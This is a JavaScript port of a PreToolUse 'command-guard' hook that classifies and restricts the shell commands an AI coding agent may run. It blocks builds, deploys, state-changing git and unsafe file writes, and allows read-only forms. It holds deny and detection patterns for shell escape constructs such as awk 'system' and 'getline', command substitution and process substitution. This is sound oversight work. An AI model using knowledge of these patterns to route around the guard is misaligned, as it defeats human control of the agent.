// check = "command" (PreToolUse on Bash): command-guard. Blocks heavy commands in the main thread (build, test, deploy, package
// managers, state-changing git/gh), main-thread Bash writes into files edit-guard would refuse for the Edit tool, and the
// DevSwarm / git-stash data-safety guards; allows the bounded read-only forms, the per-project command allowlist, the plain
// push chain, background scratch scripts and the narrow Google Cloud reads. It is also the shared command classifier
// (`classifyBashWork`): coordinator-work-guard builds on this script (script.includes) and answers with it.
//
// Mirrors hooks/command-guard.js and the libraries it uses (hooks/edit-guard.js, hooks/lib/command-allow.js,
// hooks/lib/scratchpad.js, hooks/lib/shell-scan.js, companion/lib/identity.js `rawGitInfo`). The Node functions run here as they
// are: a small compatibility layer (`fs`, `path`, `os`, `process`, `require`, below) answers their file system, path and
// settings questions from the engine's generic primitives (`ah.*`). Every table, pattern, limit and text is in command.toml (and
// the shared messages); the engine supplies only the file system, the `git` process, the settings chain and the clock.
//
// Never weaker than Node: anything that needs what the daemon cannot see (the hook process's own working directory, a settings
// file only JavaScript can read, a git layout the identity port does not classify) sets `S.unsure`, and the whole verdict defers
// (the Node hook decides). A script failure (an exception, a stack overflow, the time limit) defers too.
'use strict';

// Regular expressions used inside functions, compiled once (the interpreter compiles a literal each time it is evaluated).
var RX0 = /stack|memory|interrupt/i;
var RX1 = /^\(\?i\)/;
var RX2 = /--ack-as-owner\b|--ack\b/i;
var RX3 = /--peek\b|--seq\b/i;
var RX4 = /--ack\b/i;
var RX5 = /^[A-Za-z0-9-]+$/;
var RX6 = /^[A-Za-z0-9._-]+$/;
var RX7 = /^\s*gitdir:\s*(.+?)\s*$/m;
var RX8 = /\/+$/;
var RX9 = /\$$/;
var RX10 = /\\\$$/;
var RX11 = /^\^(?:[A-Za-z0-9_\/-]|\\\.)+(?: |\$$)/;
var RX12 = /^\{\d*,\}/;
var RX13 = / |\\s/;
var RX14 = /\\s|\\W|\\D| /;
var RX15 = /(^|[^\\])\.|\\[sWD]|\[\^| /;
var RX16 = /^[A-Za-z]:/;
var RX17 = /^[*/]+$/;
var RX18 = /[.*+?^${}()|[\]\\]/;
var RX19 = /[:,]/;
var RX20 = /(^|[\\/])(plugins|scripts|hooks|companion|statusline|tests)[\\/]/i;
var RX21 = /\.(js|mjs|cjs|jsx|ts|tsx|py|sh|go|rs|c|h|cpp|java|rb)$/i;
var RX22 = /(handover|handoff|compact.*(?:handover|handoff|prep))/i;
var RX23 = /\.md$/i;
var RX24 = /^(?:CONTINUE-HERE\.md|[^/]*\.continue-here\.md)$/;
var RX25 = /^--[A-Za-z-]+=/;
var RX26 = /^--message=/;
var RX27 = /[ \t\n;&|]/;
var RX28 = /\s+/;
var RX29 = /^[A-Za-z_][A-Za-z0-9_]*=/;
var RX30 = /\s/;
var RX31 = /</;
var RX32 = /^[a-z][a-z0-9-]*$/;
var RX33 = /^--[a-z][a-z0-9-]*=/;
var RX34 = /^--flags-file=/;
var RX35 = /(^|[^\\])\s+2>&1\s*$/;
var RX36 = /^(?:firebase|gcloud|aws|az|kubectl|helm|terraform|pulumi|vercel|netlify|heroku|serverless)\s/i;
var RX37 = /[\n\r]/;
var RX38 = /\s+2>(?:&1|\/dev\/null)$/;
var RX39 = /^-(?:\d+|[nc]\+?\d+)$/;
var RX40 = /^\+?\d+$/;
var RX41 = /^-[lcwm]$/;
var RX42 = /^\d+$/;
var RX43 = /^-[EFGivwxnHhoa]+$/;
var RX44 = /^\/?graphql$/i;
var RX45 = /[$`]/;
var RX46 = /\bmutation\b/i;
var RX47 = /^query[\s{(]/;
var RX48 = /^-[fF]./;
var RX49 = /^--(field|raw-field|input)=/;
var RX50 = /^node$/;
var RX51 = /\.(?:js|mjs|cjs)$/i;
var RX52 = /\.py$/i;
var RX53 = /^-[a-z]*c$/;
var RX54 = /^python[0-9.]*$/;
var RX55 = /^-/;
var RX56 = /^\d+[smhd]?$/;
var RX57 = /[$`'"~*?[\]{}\\<>();&|]/;
var RX58 = /[$`\\]|<\(|>\(/;
var RX59 = /(^|\s)-fsyntax-only(?=\s|$)/;
var RX60 = /^python3\s+-m\s+pytest\s+-q\s+(\S+)$/;
var RX61 = /[*?\[\]]/;
var RX62 = /\.(?:m?js|cjs|ts)$/i;
var RX63 = /[*?\[\]$`\\]/;
var RX64 = /^.+\.(?:test|spec)\.[mc]?[jt]sx?$/i;
var RX65 = /^ctest\s+-R\s+\S+$/;
var RX66 = /[$`~*?[\]{}]/;
var RX67 = /^git\s+clone\s+--depth\s+1\s+(https:\/\/\S+)\s+(\S+)$/;
var RX68 = /(^|\s)-c(?=\s|$)/;
var RX69 = /(^|\s)-m\s*\d+(?=\s|$)/;
var RX70 = /^command\s+/;
var RX71 = />/;
var RX72 = /^(?:-[a-zA-Z]*o|--output|--compress-program)/;
var RX73 = /^(?:(?:\d+|\$)(?:,(?:\d+|\$))?|\/[^\/\\]+\/)p$/;
var RX74 = /^-f|^--file|^-i|^--include|^-e|^--source/;
var RX75 = /system|getline|close|ENVIRON|fflush|[|>]/;
var RX76 = /\$\(|`|<\(|>\(|\$\{/;
var RX77 = /[()]/;
var RX78 = /^(?:!\s*)?(?:for|while|until|if|then|do|else|elif|case|select|function|time|\{)\b/;
var RX79 = /^\{/;
var RX80 = /^(?:done|fi|esac|\})$/;
var RX81 = /^&\d*$/;
var RX82 = /#/;
var RX83 = /^-|[$`~*?[\]{}\\]/;
var RX84 = />&/;
var RX85 = /[$`\\]|[<>]\(/;
var RX86 = /^git\s+add\b/i;
var RX87 = /^git\s+commit\b/i;
var RX88 = /^refs\/heads\//;
var RX89 = /^[0-9a-f]{7,40}$/i;
var RX90 = /[ \t]+>>?[ \t]*([^\s<>&|;'"`$\\]+)((?:[ \t]+2>&1)?)[ \t]*$/;
var RX91 = /^cd\b/i;
var RX92 = /^-[A-Za-z]*f/;
var RX93 = /^--file(?:=|$)/;
var RX94 = /[{}\[\]]/;
var RX95 = /^https:\/\/([^/?#:]*)/;
var RX96 = /^[A-Za-z0-9.-]+$/;
var RX97 = /^:([^/?#]*)/;
var RX98 = /^\d*$/;
var RX99 = /^0+/;
var RX100 = /^[\d.]+$/;
var RX101 = /[`\\]|[<>]\(/;
var RX102 = /[$`\\]/;
var RX103 = /^https:\/\/[^\s$`\\@]+$/;
var RX104 = /\$/;
var RX105 = /^(?:--dry-run|-[A-Za-z]*n[A-Za-z]*)$/;
var RX106 = /^--apply$/;
var RX107 = /^--(?:check|stat|numstat|summary)$/;
var RX108 = /^(?:-[cC]|--create|--force-create)(?:=|$)/;
var RX109 = /^-[cC]\S/;
var RX110 = /^(?:-[bB]|--orphan)(?:=|$)/;
var RX111 = /^-[bB]\S/;
var RX112 = /^(?:-[A-Za-z]*[Df][A-Za-z]*|--force)$/;
var RX113 = /^(?:-d|--delete)$/;
var RX114 = /[;|&<>()]/;
var RX115 = /[<>]/;
var RX116 = /\(\(|\[\[/;
var RX117 = /[;&|(!\n]/;
var RX118 = /[A-Za-z]/;
var RX119 = /[\s;&|)<>]|^$/;
var RX120 = /^\/dev\//;
var RX121 = /^--(?:expression|file)=/;
var RX122 = /^--in-place(?:=|$)/;
var RX123 = /^-[A-Za-z]/;
var RX124 = /^-[^-]/;
var RX125 = /^--target-directory=/;
var RX126 = /^-t./;
var RX127 = /[$`*?[\]{}~]/;
var RX128 = /^[-+]/;
var RX129 = /`|\$\(/;
var RX130 = /^\/(?:bin|sbin|Applications)\//;
var RX131 = /^\/(?:usr|opt)\//;
var RX132 = /(?:^|\/)node_modules\/\.bin\//;
var RX133 = /(?:^|\/)(?:\.venv|venv|\.virtualenv)\/bin\//;
var RX134 = /^[rwaxbt+]{1,4}$/;
var RX135 = /[wax+]/;
var RX136 = /[$`*?[\]{}]/;
var RX137 = /[<>]\(/;
var RX138 = /^(\s*cd\s+[^;&|\n]+?)\s*;/;

// ---------------------------------------------------------------------------------------------------------------------
// per-call state and the compatibility layer

var S = null;                // the state of the call in progress
var T = null, TGEN = -1;     // the tables, rebuilt when the defaults generation changes
var __dirname = '';          // the hooks directory of the plugin (set per call)

// The answer depends on something only the Node hook process can see: remember it (a Node `catch` may swallow the throw) and defer.
function unsure() {
  var e = new Error('unsure');
  if (S) { if (!S.unsure) ah.log('command_unsure', String(e.stack)); S.unsure = true; }
  e.unsure = true;
  throw e;
}
// A stack overflow, memory or time-limit exception must reach the engine (it then defers), never be swallowed by a fail-open catch.
function cmdFatal(e) {
  return !!(e && (e.unsure || e instanceof RangeError || RX0.test(String(e.message || e))));
}
// JavaScript's `\s` for one UTF-16 unit
function cmdWs(c) {
  var n = c.charCodeAt(0);
  return n === 32 || (n >= 9 && n <= 13) || n === 160 || n === 5760 || (n >= 8192 && n <= 8202) || n === 8232 || n === 8233 || n === 8239 || n === 8287 || n === 12288 || n === 65279;
}
function cmdErr(code, msg) { var e = new Error(code + ': ' + msg); e.code = code; return e; }

var path = (function () {
  var isAbs = function (p) { return String(p).charCodeAt(0) === 47; };
  var self = {
    sep: '/',
    isAbsolute: function (p) { return isAbs(p); },
    // with no absolute argument the result depends on process.cwd(): the hook's own, which the daemon cannot see
    resolve: function () {
      var a = [];
      for (var i = 0; i < arguments.length; i++) a.push(String(arguments[i]));
      if (!a.some(isAbs)) unsure();
      return posix.resolveIn('/', a);
    },
    join: function () { return posix.join.apply(null, Array.prototype.map.call(arguments, String)); },
    dirname: function (p) { return posix.dirname(String(p)); },
    basename: function (p, ext) {
      var b = posix.basename(String(p));
      return ext && b.length > ext.length && b.slice(-ext.length) === ext ? b.slice(0, -ext.length) : b;
    },
    normalize: function (p) { return posix.normalize(String(p)); },
    relative: function (a, b) {
      a = String(a); b = String(b);
      if (!isAbs(a) || !isAbs(b)) unsure();
      return ah.path.relative(a, b);
    },
  };
  self.posix = self;
  return self;
})();

var fs = (function () {
  function stat(l) {
    return {
      isFile: function () { return l.kind === 'file'; }, isDirectory: function () { return l.kind === 'dir'; },
      isSymbolicLink: function () { return l.kind === 'link'; }, size: l.size, mode: l.mode, mtimeMs: l.mtimeMs, nlink: l.nlink || 1,
    };
  }
  function lstatSync(p) {
    p = String(p);
    if (!path.isAbsolute(p)) unsure();
    var l = ah.fs.lstat(p);
    if (l === null) throw cmdErr('ENOENT', 'no such file or directory, lstat ' + p);
    if (l.kind === 'error') throw cmdErr('EIO', 'lstat ' + p + ' ' + l.code);
    return stat(l);
  }
  // JavaScript's realpathSync resolves `..` lexically first; the native one is libc realpath.
  function real(p, native) {
    p = String(p);
    if (!path.isAbsolute(p)) unsure();
    var r = ah.fs.realpathEx(native ? p : path.resolve(p));
    if (r.error) throw cmdErr(r.error === 'NotFound' ? 'ENOENT' : 'EIO', 'realpath ' + p);
    return r.path;
  }
  function realpathSync(p) { return real(p, false); }
  realpathSync.native = function (p) { return real(p, true); };
  function statSync(p) {
    var rp = real(p, true);
    var l = ah.fs.lstat(rp);
    if (l === null || l.kind === 'error') throw cmdErr('ENOENT', 'no such file or directory, stat ' + p);
    return stat(l);
  }
  return {
    lstatSync: lstatSync, realpathSync: realpathSync, statSync: statSync,
    existsSync: function (p) { try { real(p, true); return true; } catch (e) { if (e && e.unsure) throw e; return false; } },
    readFileSync: function (p) {
      p = String(p);
      if (!path.isAbsolute(p)) unsure();
      var t = ah.fs.readText(p);
      if (t === null) throw cmdErr('ENOENT', 'no such file or directory, open ' + p);
      return t;
    },
  };
})();

var os = {
  // os.tmpdir(): the first of the TMPDIR-like variables that is set, a trailing slash cut
  tmpdir: function () {
    var names = ah.cfg('command.tmp_env_names'), v = null;
    for (var i = 0; i < names.length && !v; i++) { var x = ah.env.get(names[i]); if (x) v = x; }
    if (!v) v = ah.cfg('command.tmp_default');
    return v.length > 1 && v.charAt(v.length - 1) === '/' ? v.slice(0, -1) : v;
  },
  // HOME, else USERPROFILE; with neither the answer is the hook process's passwd lookup, which is not reproduced
  homedir: function () {
    var h = ah.env.get(ah.cfg('env.home'));
    if (h === null || h === '') h = ah.env.get(ah.cfg('env.home_alt'));
    if (h === null || h === '') unsure();
    return h;
  },
  userInfo: function () { return { homedir: ah.env.passwdHome() || '' }; },
};

var process = {
  cwd: function () { unsure(); },
  platform: 'linux',
  getuid: function () { return ah.uid(); },
  pid: 0,
  env: new Proxy({}, { get: function (t, k) { return typeof k === 'string' ? ahUndef(ah.env.get(k)) : undefined; } }),
};
function ahUndef(v) { return v === null ? undefined : v; }

// One bounded git run, the shape of child_process.spawnSync for `git`.
function gitSpawn(args, opts) {
  var cwdArg = opts && opts.cwd ? String(opts.cwd) : null;
  if (args[0] === '-C') { cwdArg = args[1]; args = args.slice(2); }
  if (cwdArg !== null && !path.isAbsolute(cwdArg)) unsure();
  var env = opts && opts.env && opts.env.GIT_OPTIONAL_LOCKS !== undefined ? { GIT_OPTIONAL_LOCKS: opts.env.GIT_OPTIONAL_LOCKS } : undefined;
  var r = ah.exec('git', args, { cwd: cwdArg === null ? undefined : cwdArg, env: env, timeoutMs: (opts && opts.timeout) || ah.cfgNum('command.git_timeout_ms') });
  if (r === null) return { status: null, stdout: '', stderr: '', error: new Error('spawn git') };
  return { status: r.status, stdout: r.stdout, stderr: r.stderr, error: undefined };
}
var childProcess = {
  spawnSync: function (prog, args, opts) {
    if (prog !== 'git') return { status: null, stdout: '', stderr: '', error: new Error('spawn ' + prog) };
    return gitSpawn(args, opts);
  },
  execFileSync: function (prog, args, opts) {
    var r = childProcess.spawnSync(prog, args, opts);
    if (r.error || r.status !== 0) throw new Error('Command failed: ' + prog);
    return r.stdout;
  },
};

var LIB = { fs: fs, path: path, os: os, child_process: childProcess };
function require(n) {
  if (!Object.prototype.hasOwnProperty.call(LIB, n)) throw new Error('Cannot find module ' + n);
  return LIB[n];
}

// ---------------------------------------------------------------------------------------------------------------------
// tables

function cmdSet(k) { return new Set(ah.cfg(k)); }
function cmdRe(src, flags) {
  var f = flags || '';
  if (src.slice(0, 4) === '(?i)') { src = src.slice(4); f += 'i'; }
  return new RegExp(src, f);
}
function cmdEsc(s) { return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }

// The defaults entries that describe the settings the script reads.
var SETTING_KEYS = [
  'command.allow_subagent_mailbox_setting', 'command.stash_guard_setting', 'command.inbox_cmd_setting', 'command.setting_allow_read_only_verify',
  'command.setting_allow_read_only_verify_scripts', 'command.setting_project_command_allow', 'command.setting_allow_plain_push',
  'command.setting_allow_bg_scratch', 'command.setting_allow_gcloud_reads', 'command.setting_bash_edit_parity', 'command.setting_project_edit_allow',
  'command.eg_allow_setting', 'command.tier_repos_setting', 'command.tier_detect_setting', 'command.tier_text_setting',
  'coordinator_work.command_guard_setting', 'edit_guard.setting',
];
function cmdBuildTables() {
  var t = {};
  t.maxLen = ah.cfg('command.max_classify_len'); t.maxDepth = ah.cfg('command.max_depth');
  t.heavyVerbs = cmdSet('command.heavy_verbs'); t.heavyPatterns = ah.cfg('command.heavy_patterns').map(function (s) { return cmdRe(s); });
  t.light = ah.cfg('command.light_exceptions').map(function (s) { return cmdRe(s); }).concat(ah.cfg('command.light_exceptions_neg').map(function (n) {
    return cmdRe(n.head + '\\b(?![^\\n]*' + n.not_after.replace(RX1, '') + ')');
  }));
  t.devswarmVerbs = cmdSet('command.devswarm_cli_verbs');
  var alt = '(?:' + ah.cfg('command.devswarm_cli_verbs').join('|') + ')';
  var hv = function (w) { return new RegExp('\\b' + alt + '\\s+(?:-\\S+\\s+)*workspace\\s+(?:-\\S+\\s+)*' + w + '\\b', 'i'); };
  t.hcMonitor = hv('monitor'); t.hcReadMessages = hv('read-messages'); t.hcMessageChild = hv('message-child'); t.hcMessageParent = hv('message-parent');
  var fskip = ah.cfg('command.mailbox_flag_skip'), pre = ah.cfg('command.mailbox_js_prefix');
  var mailboxAlt = '(?:inbox\\s+' + fskip + '(?:pull|ack|read-primary|drain-primary-legacy|read|tick)\\b|heartbeat\\b|reap-orphans\\b|register(?!-)\\b|archive(?!-)\\b)';
  var mb = function (tail) { return new RegExp('\\b' + pre + '\\s+' + fskip + tail, 'i'); };
  t.mbMailbox = mb(mailboxAlt); t.mbInbox = mb('inbox\\s+' + fskip + 'messages\\b'); t.mbMesh = mb('mesh\\s+' + fskip + 'read\\b'); t.mbRoster = mb('roster\\b');
  t.ackFlag = RX2; t.meshSafe = RX3; t.rosterAck = RX4;
  t.stashGlobalValue = cmdSet('command.stash_global_value_opts'); t.stashPushValue = cmdSet('command.stash_push_value_flags');
  t.fileReadVerbs = cmdSet('command.file_read_verbs'); t.patternFirstVerbs = cmdSet('command.pattern_first_verbs');
  t.wrappers = cmdSet('command.wrappers'); t.sudoValue = cmdSet('command.sudo_value_flags'); t.timeoutValue = cmdSet('command.timeout_value_flags');
  t.niceValue = cmdSet('command.nice_value_flags'); t.taskpolicyValue = cmdSet('command.taskpolicy_value_flags');
  t.shellVerbs = cmdSet('command.shell_verbs'); t.testKeywords = cmdSet('command.test_keywords');
  t.nodeEvalFlags = cmdSet('command.node_eval_flags'); t.nodeEvalDeny = ah.cfg('command.node_eval_deny').map(function (s) { return cmdRe(s); });
  t.nodeFsCall = new RegExp(ah.cfg('command.node_fs_method_call'), 'g'); t.nodeFsRead = cmdSet('command.node_fs_read_allowlist');
  t.fetchDangerous = cmdSet('command.git_fetch_dangerous_flags'); t.gitGlobalValue = cmdSet('command.git_global_value_opts'); t.gitGlobalFlag = cmdSet('command.git_global_flag_opts');
  t.gitHeavySubs = cmdSet('command.git_heavy_subs');
  t.sqliteDangerous = cmdRe(ah.cfg('command.sqlite_dangerous'));
  t.gcloudRefused = cmdRe(ah.cfg('command.gcloud_refused_path')); t.gcloudBool = cmdSet('command.gcloud_boolean_flags'); t.gcloudValue = cmdSet('command.gcloud_value_flags');
  t.gcloudInspect = cmdSet('command.gcloud_inspect_verbs'); t.gcloudLogging = ah.cfg('command.gcloud_logging_group');
  t.cloudBinaries = cmdSet('command.cloud_binaries'); t.cloudReadonly = cmdSet('command.cloud_readonly_verbs'); t.cloudMutating = cmdSet('command.cloud_mutating_verbs');
  t.wholeClis = ah.cfg('command.whole_command_clis');
  t.versionCli = new RegExp('^(?:' + t.wholeClis.map(cmdEsc).join('|') + ')\\s+(?:--version|-V)$', 'i');
  t.wholeCliStart = new RegExp('^(?:' + t.wholeClis.map(cmdEsc).join('|') + ')\\s', 'i');
  t.ghMutating = {};
  Object.keys(ah.cfg('command.gh_mutating_subcommands')).forEach(function (g) { t.ghMutating[g] = new Set(ah.cfg('command.gh_mutating_subcommands')[g]); });
  t.ghApiMethods = cmdSet('command.gh_api_mutating_methods'); t.ghGqlValue = cmdSet('command.gh_gql_value_flags'); t.ghGqlBool = cmdSet('command.gh_gql_bool_flags');
  t.ghField = cmdSet('command.gh_api_field_flags');
  t.timeoutPrefix = cmdRe(ah.cfg('command.timeout_prefix')); t.controlPrefix = cmdRe(ah.cfg('command.control_keyword_prefix'));
  t.scriptInterp = cmdRe(ah.cfg('command.script_check_interpreter'));
  t.nodeExt = cmdRe(ah.cfg('command.node_script_ext')); t.pyExt = cmdRe(ah.cfg('command.python_script_ext'));
  t.verifySyntaxCompilers = cmdSet('command.verify_syntax_only_compilers'); t.verifyTrivial = cmdSet('command.verify_trivial_verbs');
  t.checkFlagRefused = cmdSet('command.check_flag_refused_verbs');
  t.gcloudReadVerbs = cmdSet('command.gcloud_read_verbs'); t.jqSafe = cmdSet('command.jq_safe_flags'); t.curlBare = cmdSet('command.curl_bare_flags');
  t.jqRefusedWords = ah.cfg('command.jq_refused_words'); t.gcloudTokenVars = ah.cfg('command.gcloud_token_vars');
  t.bgInterpreters = cmdSet('command.background_script_interpreters'); t.bgDelims = cmdSet('command.background_chain_delims');
  t.plainReadGitKinds = cmdSet('command.plain_read_git_kinds');
  t.bgSafeFlags = {}; Object.keys(ah.cfg('command.background_script_safe_flags')).forEach(function (k) { t.bgSafeFlags[k] = new Set(ah.cfg('command.background_script_safe_flags')[k]); });
  t.cdDelims = ah.cfg('command.cd_delims'); t.pipelineEnds = ah.cfg('command.pipeline_ends'); t.cdContextsMax = ah.cfg('command.cd_contexts_max');
  t.inlineVerbs = cmdSet('command.inline_verbs'); t.inlinePythonFlags = ah.cfg('command.inline_python_flags'); t.inlineOtherFlags = ah.cfg('command.inline_other_flags');
  t.inlineWriteMarkers = ah.cfg('command.inline_write_markers');
  t.gitAlwaysWork = cmdSet('command.git_always_work'); t.gitTagValue = cmdSet('command.git_tag_value_flags');
  t.scriptShells = cmdSet('command.script_shells'); t.scriptInterpreters = cmdSet('command.script_interpreters');
  t.scriptNotRunFlag = {}; Object.keys(ah.cfg('command.script_not_a_run_flag')).forEach(function (f) { t.scriptNotRunFlag[f] = new RegExp(ah.cfg('command.script_not_a_run_flag')[f]); }); t.scriptValueFlags = cmdSet('command.script_value_flags');
  t.binaryMagics = ah.cfg('command.binary_magics'); t.homeManaged = ah.cfg('command.home_managed_dirs'); t.homePersonal = ah.cfg('command.home_personal_dirs');
  t.antiHallCli = ah.cfg('command.anti_hall_cli_patterns').map(function (s) { return cmdRe(s); });
  t.unknowable = ah.cfg('command.write_target_unknowable');
  t.classifyPushSubs = cmdSet('command.classify_push_subs'); t.classifyPullSubs = cmdSet('command.classify_pull_subs');
  t.stashReadSubs = cmdSet('command.stash_read_subs'); t.stashMutatingSubs = cmdSet('command.stash_mutating_subs');
  t.pluginWalkLevels = ah.cfgNum('command.plugin_walk_levels'); t.pluginManifestRel = ah.cfg('command.plugin_manifest_rel'); t.pluginName = ah.cfg('command.plugin_name');
  t.gitBranchArgv = ah.cfg('command.git_branch_argv'); t.gitTimeout = ah.cfgNum('command.git_timeout_ms'); t.gitStatusTimeout = ah.cfgNum('command.git_status_timeout_ms');
  t.gcloudSinkVerbs = cmdSet('command.gcloud_sink_verbs');
  // The settings the script reads by section and key (`settings.get(section, key)` of the Node hooks): each entry's own section and key say
  // which setting it is.
  t.settings = {};
  SETTING_KEYS.forEach(function (k) { var e = ah.cfg(k); t.settings[e.section + '.' + e.key] = k; });
  return t;
}
function cmdTables() {
  var g = ahHost.cfgGen();
  if (T === null || g !== TGEN) { T = cmdBuildTables(); TGEN = g; }
  return T;
}

// The settings chain (hooks/lib/settings.js): `get` answers undefined when the setting is absent everywhere.
// A call asks the same few settings several times and each ask reads the settings file: the answers are kept for the call.
function cmdMemo(name, fn) {
  if (S === null) return fn();
  if (S.memo === undefined) S.memo = Object.create(null);
  if (!(name in S.memo)) S.memo[name] = fn();
  return S.memo[name];
}
var settings = {
  get: function (section, key) {
    return cmdMemo('get:' + section + '.' + key, function () { return settings.getRaw(section, key); });
  },
  getRaw: function (section, key) {
    var k = T.settings[section + '.' + key];
    if (k === undefined) unsure();
    var entry = ah.cfg(k);
    // a free-text setting has no type: its value is a string (the entry's default when unset)
    if (entry.type === undefined && typeof entry.default === 'string') return ah.settings.str(k);
    var r = ah.settings.get(k, undefined, S.pluginRoot);
    if (r.status === 'undecidable') unsure();
    return r.status === 'value' ? r.value : undefined;
  },
  enabled: function (section, key) {
    return cmdMemo('enabled:' + section + '.' + key, function () {
      var k = T.settings[section + '.' + key];
      if (k === undefined) unsure();
      return ah.settings.bool(k);
    });
  },
  getWithEnv: function (section, key) { var v = settings.get(section, key); return v === undefined ? '' : v; },
};
function settingsGet(section, key) { return settings.get(section, key); }
LIB['./lib/settings.js'] = settings;

// hooks/skip-guard.js
LIB['./skip-guard.js'] = { isSkipped: function (name) { return cmdSkipped(name); } };
function cmdSkipped(name) { return cmdMemo('skip:' + name, function () { return ah.settings.skipped(name); }); }

// hooks/lib/block-message.js
LIB['./lib/block-message.js'] = { blockMessage: function (p) { return text.message('block', p.guard, p); } };

// hooks/lib/host-text.js and hooks/coordinator-detect.js
LIB['./lib/host-text.js'] = {
  isCodex: function (p) { return coordinator.isCodexPayload(p); },
  get CODEX_SUBAGENT() { return ah.cfg('command.codex_subagent'); },
  get CODEX_CHEAP() { return ah.cfg('command.codex_cheap'); },
};
LIB['./coordinator-detect.js'] = {
  isCoordinator: function (p) { return coordinator.isCoordinator(p); },
  isCodexPayload: function (p) { return coordinator.isCodexPayload(p); },
  // an agent marker key is present and not null (a present but falsy value still counts)
  isSubagentByPayload: function (p) {
    return p !== null && typeof p === 'object' && !Array.isArray(p) && ah.cfg('command.agent_markers').some(function (k) {
      return Object.prototype.hasOwnProperty.call(p, k) && p[k] !== null;
    });
  },
};

// hooks/lib/devswarm-detect.js and devswarm-role.js
LIB['./lib/devswarm-detect.js'] = { isDevswarmActive: function () { return cmdMemo('dsActive', function () { return spawn.devswarmActive(); }); } };
LIB['./lib/devswarm-role.js'] = {
  isChildWorkspace: function () { var v = ah.env.get(ah.cfg('command.child_env')); return v !== null && v.trim() !== ''; },
};

// hooks/lib/scratchpad.js
LIB['./lib/scratchpad.js'] = (function () {
  function tmpRoots() {
    var roots = [], seen = new Set();
    var add = function (r) { if (typeof r === 'string' && r && !seen.has(r)) { seen.add(r); roots.push(r); } };
    add(os.tmpdir());
    ah.cfg('command.tmp_fixed_roots').forEach(add);
    return roots;
  }
  function encodeHarnessCwd(cwd) { return typeof cwd !== 'string' || !cwd ? null : cwd.replace(/[^A-Za-z0-9]/g, '-'); }
  function transcriptEncodedSegment(payload) {
    var tp = payload && payload.transcript_path;
    if (typeof tp !== 'string' || !tp || !path.isAbsolute(tp)) return null;
    var segment = path.basename(path.dirname(tp));
    return !segment || !RX5.test(segment) ? null : segment;
  }
  function ownScratchpadDirs(payload) {
    try {
      var cwd = payload && payload.cwd, sessionId = payload && payload.session_id;
      if (typeof sessionId !== 'string' || !RX6.test(sessionId)) return [];
      var uid = ah.uid();
      var sanitized = transcriptEncodedSegment(payload);
      if (!sanitized) {
        if (typeof cwd !== 'string' || !cwd || !path.isAbsolute(cwd)) return [];
        sanitized = encodeHarnessCwd(cwd);
      }
      if (!sanitized) return [];
      return tmpRoots().map(function (root) {
        return path.join(root, ah.cfg('command.scratch_uid_prefix') + uid, sanitized, sessionId, ah.cfg('command.scratch_leaf'));
      });
    } catch (e) {
      if (cmdFatal(e)) throw e;
      return []; // fail CLOSED: no exemption on any unexpected error
    }
  }
  function realpathOrSelf(p) {
    try { return fs.realpathSync(p); } catch (e) {
      if (e && e.unsure) throw e;
      var cur = p, suffix = [];
      for (;;) {
        var parent = path.dirname(cur);
        if (parent === cur) return p;
        suffix.unshift(path.basename(cur));
        cur = parent;
        try { return path.join.apply(null, [fs.realpathSync(cur)].concat(suffix)); } catch (e2) { if (e2 && e2.unsure) throw e2; }
      }
    }
  }
  function isInsideDir(p, dir) {
    try {
      var rel = path.relative(realpathOrSelf(dir), realpathOrSelf(path.resolve(p)));
      return !!rel && rel.indexOf('..') !== 0 && !path.isAbsolute(rel);
    } catch (e) { if (cmdFatal(e)) throw e; return false; }
  }
  return { tmpRoots: tmpRoots, encodeHarnessCwd: encodeHarnessCwd, ownScratchpadDirs: ownScratchpadDirs, realpathOrSelf: realpathOrSelf, isInsideDir: isInsideDir };
})();

// companion/lib/identity.js (`resolveContext` from the engine's identity port, and `rawGitInfo`)
LIB['../companion/lib/identity.js'] = (function () {
  function resolveContext(cwd, opts) {
    var d = cwd == null || cwd === '' ? process.cwd() : String(cwd);
    if (!path.isAbsolute(d)) unsure();
    var c = ah.repo.context(d, !!(opts && opts.missingPath === 'ancestor'));
    if (c.unsure) unsure();
    return { toplevel: c.toplevel, worktreeRoot: c.root };
  }
  function gitdirOf(F, Tt) {
    var dotGit = path.join(Tt, '.git'), st;
    try { st = F.lstatSync(dotGit); } catch (e) { if (e && e.unsure) throw e; return null; }
    var G, isFile = false;
    try {
      if (st.isDirectory()) G = F.realpathSync(dotGit);
      else {
        isFile = true;
        var m = RX7.exec(String(F.readFileSync(dotGit, 'utf8')));
        if (!m || !m[1]) return null;
        G = F.realpathSync(path.resolve(Tt, m[1]));
        if (!F.statSync(G).isDirectory()) return null;
      }
    } catch (e) { if (e && e.unsure) throw e; return null; }
    var common = G, hasCommondir = false;
    try {
      var raw = String(F.readFileSync(path.join(G, 'commondir'), 'utf8')).trim();
      if (raw) { common = F.realpathSync(path.resolve(G, raw)); hasCommondir = true; }
    } catch (e) { if (e && e.unsure) throw e; /* no commondir: G is its own common dir */ }
    return { G: G, isFile: isFile, common: common, hasCommondir: hasCommondir, dotGitIsDir: !isFile };
  }
  function nearestDotGit(F, dir) {
    var d = dir;
    for (;;) {
      try { F.lstatSync(path.join(d, '.git')); return d; } catch (e) { if (e && e.unsure) throw e; /* keep walking */ }
      var parent = path.dirname(d);
      if (parent === d) return null;
      d = parent;
    }
  }
  function rawGitInfo(dir) {
    try {
      var abs = path.resolve(String(dir)), real;
      try { real = fs.realpathSync(abs); } catch (e) { if (e && e.unsure) throw e; return null; }
      var Tt = nearestDotGit(fs, real);
      if (!Tt) return null;
      var info = gitdirOf(fs, Tt);
      return info ? { commonDir: info.common, toplevel: Tt } : null;
    } catch (e) { if (cmdFatal(e)) throw e; return null; }
  }
  return { resolveContext: resolveContext, rawGitInfo: rawGitInfo };
})();

// hooks/lib/jev-assist.js scrubSecrets
LIB['./lib/jev-assist.js'] = { scrubSecrets: function (t) { return ah.scrub(t); } };

// ---------------------------------------------------------------------------------------------------------------------
// hooks/lib/skip-cmd.js, hooks/lib/dispatch-tier.js `noWorkspaceRepo`, hooks/lib/primary-tier.js

LIB['./lib/skip-cmd.js'] = {
  skipCommand: function (key) {
    // the plugin's own devswarm CLI, quoted; the plugin root must be known to name it
    if (!S.pluginRoot) unsure();
    var real = ah.fs.realpath(S.pluginRoot);
    if (real === null) unsure();
    var cli = path.join(real, ah.cfg('command.devswarm_cli_rel'));
    return text.render(ah.cfg('command.msg_edit_skip_cmd').replace('edit-guard', key), { cli: "'" + cli.replace(/'/g, "'\\''") + "'" });
  },
};

